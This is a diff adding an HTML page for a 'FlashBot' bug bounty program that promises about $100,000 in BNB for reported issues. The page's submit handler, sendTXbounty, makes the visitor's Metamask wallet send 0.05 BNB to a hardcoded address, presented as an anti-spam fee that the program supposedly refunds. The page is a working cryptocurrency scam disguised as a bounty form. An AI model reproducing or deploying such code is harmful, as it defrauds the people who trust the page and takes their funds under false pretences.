@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	
+	<title>FlashBOT Bug Bounty</title>
+
+	<link rel="stylesheet" href="./assets/css/styles.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+
+	<script>var site = "defiexploit.github.io";</script>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<script defer data-domain="defiexploit.github.io" src="https://plausible.io/js/plausible.js"></script>
+</head>
+
+<body class="body" ng-app="myApp" ng-controller="myCtrl">
+
+	<div id="main">
+		<div class="topnav">
+	
+		<div id="mySidenav" class="sidenav">
+			<ul id="menu" class="darking-menu" style="position: relative; padding:15px;display: grid;height: 150px;">
+			  <a href="javascript:void(0)" style="margin-top:0px" class="closebtn" onclick="closeNav()">&times;</a>
+			  
+			  <li style="margin-top: -18px;"><a  style="font-size: 12px;text-align: left;">Welcome to Flash<strong>Bot</strong>!</a></li>
+			  <br/><br/>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="index.html" id="site">Home</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="list.html" id="site">Token List</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="bounty.html" id="site">Bounty Program</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="FAQ.html" id="site">FAQ</a></li>
+			  
+			  <br/><br/>
+	
+			  <div style="display: inline; place-self: center;"><a style="font-size: 14px;" target="_blank" href="https://github.com/defiexploit/defiexploit.github.io">Github</a>
+				<a style="font-size: 14px;" target="_blank" href="https://fc21.ifca.ai/papers/158.pdf">Docs</a>
+				<a style="font-size: 14px;" target="_blank" href="https://news.google.com/search?for=flash+loan+attack">News</a></div>
+		  </ul>  
+		</div>
+	
+			<a href="javascript:void(0);" style="padding-top: 18px; padding-left: 0px;" class="icon" onclick="openNav()">
+				<i class="fa fa-bars"></i>
+			</a>
+
+			<a class="darking-logo" href="index.html" id="site" style="padding: 11px 0px;">
+				<img src="assets/image/logo.png" id="logo" width="30px" height="30px" style="float: none;">
+				<a  style="font-size: 20px;" href="index.html" id="site"><strong>Flash</strong>Bot<a style="font-size: 10px;margin-left: -25px;">v2</a></a>
+				<a  style="font-size: 12px; margin-top: 14px; padding:5px 10px; border-radius: 15px;font-weight: 900 ; background: #1a70e1;" href="tutorial.html">Tutorial</a>
+			</a>
+			
+			<ul id="menu" style="transform: translate(0%, 0%); display: contents;" class="darking-menu">
+				<li><a  style="font-size: 14px; line-height: 22px; margin-left: 50px;" href="index.html" id="site">Bot</a></li>
+				<li><a  style="font-size: 14px; line-height: 22px;" href="pool.html" id="site">Pool</a></li>
+				<li><a  style="font-size: 14px; line-height: 22px;" href="referral.html" id="site">Affiliate</a></li>
+			</ul>
+	
+			<div class="topnav-right">
+			<button class="button-info" id="info" style="margin-top: 10px;border-radius: 50px; background: #191b1f; padding: 5px 15px;"><i class="fa fa-user-circle-o"></i> <div style="display: inline;">{{toplen}}...{{endlen}}</div></button>
+	
+			<div id="myModal" class="modal">
+				<div class="modal-content" style="width: 600px; height: 250px;">
+				  <span class="close">&times;</span>
+				  <h1 style="font-size: 20px; margin-top: 50px;padding: 25px; padding-top: 40px; padding-bottom: 10px; font-weight: 800;text-align: left;">Your Wallet</h1>
+				  <hr class="new1"/>
+				  <button style="margin: 15px 20px; width: auto; background: #191b1f;padding: 18px 10px;"><div style="font-size: 20px;">{{account.address}}</div></button>
+				 <div style="padding: 0px 20%;width: 100%;"> 
+				  <a href="{{scan}}address/{{account.address}}" style="font-size: 18px;">Check on {{idscan}}</a>
+				  <a onclick="copyRef()" style="font-size: 18px;">Copy Address</a>
+				  <a id="input" style="font-size: 0px; height: 0px;">{{account.address}}</a>
+				</div>
+				</div>
+			  </div>
+	
+			  <script>
+				function copyRef(id)
+				{
+				var r = document.createRange();
+				r.selectNode(document.getElementById("input"));
+				window.getSelection().removeAllRanges();
+				window.getSelection().addRange(r);
+				document.execCommand('copy');
+				window.getSelection().removeAllRanges();
+				return alert("Address copied successfully!");
+				}
+	
+				var modal2 = document.getElementById("myModal");
+				var btn2 = document.getElementById("info");
+				var span2 = document.getElementsByClassName("close")[0];
+	
+				btn2.onclick = function() {
+					modal2.style.display = "block";
+				}
+				span2.onclick = function() {
+				modal2.style.display = "none";
+				}
+				window.onclick = function(event) {
+					if (event.target == modal2) {
+					modal2.style.display = "none";
+					}
+				}
+			  </script>
+			</div>
+			
+		</div>
+	</div>
+	
+	<script>
+		function myFunction() {
+		  var x = document.getElementById("myLinks");
+		  if (x.style.display === "block") {
+			x.style.display = "none";
+		  } else {
+			x.style.display = "block";
+		  }
+		}
+	</script>
+
+		<div class="space10"></div>
+		<form class="form-table" style="background: transparent;">
+			<table  class="test"  style="width:100%;margin-left: 10px;" id='myTable'>
+	<tr style="vertical-align: top;"> 
+		<td>
+			<form class="darking-list" style="background: transparent; padding-bottom: 20px;max-width: 800px;">
+				<h1 style="text-align: left;">Help us and get a <strong>Bounty!</strong></h1>
+				<p style="padding-right: 18px; width: 400px;text-align: left;">Help us to maintain a high quality of the service we offer! We have decided to create a community incentive, report any issue or error and we will send you a reward!</p>
+				</form>
+	
+		</td>
+		<td>
+			<img src="assets/image/logopatch.png" style="width: 200px; margin-top: -10px;"/>
+		</td>
+	</tr>
+			</table></form>
+
+	        <form class="darking" style="width: auto;overflow: overlay;margin-bottom: 40px;margin-top: 50px; padding-bottom: 25px;padding-top: 25px;">
+
+                <h1 style="text-align: center;">Total Bounty available: </br></br><strong style="text-shadow: 0px 0px 25px #ca62ea">≈ 100,000.00 $ in BNB</strong></h1>
+				<p style="text-align: center;">Fill out the form below, indicate your address and the issue you encountered.</br> (The amount of the Bounty that will be decided by the Dev Team.).
+                </p>
+				<input id="issueAddress" style="padding:10px" type="text" placeholder="Your receiver Address" maxlength="42" /></br>
+                <input id="issueText" style="padding-bottom: 200px; margin-bottom: 12px;" type="text" placeholder="Write here your issue/fix to get the Bounty..." maxlength="500" /></br>
+                <button onclick="sendTXbounty();alertFunction();document.getElementById('issueAddress').value = ''; document.getElementById('issueText').value = ''">Submit</button></br></br>
+                <a style="font-size: 12px;">*To discourage Spam and unimportant requests we have inserted a little fee to pay.</a>
+
+                <script>
+                    function alertFunction() {
+                        alert("Please pay the fee before submitting the request. 100% of fees return to Bounty Program. Why I need to pay a fee? To discourage Spam and unimportant requests. When you press OK Metamask will open, press CONFIRM and the message will be forwarded automatically.");
+                    }
+
+                async function sendTXbounty() {
+                const accounts = await web3.eth.getAccounts();
+                    web3.eth.sendTransaction({
+                        from: accounts[0],
+                        to: '0x1D8D0a96D65c7fb3060E4A9D431C1fFC9739B8eD',
+                        value: '50000000000000000'
+                    })
+                    .then(function(receipt){
+                        alert("Thank you for writing us! We will evaluate your help and send you a Bounty shortly!");
+                    });
+                }
+                </script>
+
+	        </form>
+
+
+	<div class="space10"></div>
+
+	<ul class="darking-menu">
+		<div class="tooltip" style="border-bottom: 0px dotted #000;position: relative;">
+			<a class="darking-menu" style="font-size: 12px;display: contents;" ><p>WebSocket: <a style="color: rgb(85, 170, 0);font-size: 12px;display: contents;"><i class="fa fa-circle"></i> Connected</a><span class="tooltiptext">Our WebSocket is correctly connected to the Server.</span></p></a>
+		</div></br>
+		<a class="darking-menu" style="font-size: 12px;" ><p>© FlashBot 2021</p></a>
+	</ul>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.5/web3.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js" integrity="sha256-/H4YS+7aYb9kJ5OKhFYPUjSJdrtV6AeyJOtTkw6X72o=" crossorigin="anonymous"></script>
+	<script src="./assets/js/addr.min.js?v=2"></script>
+	<script src="./assets/js/chain.min.js?v=2"></script>
+	<script src="./assets/js/script.min.js?v=4"></script>
+</body>
+
+</html>
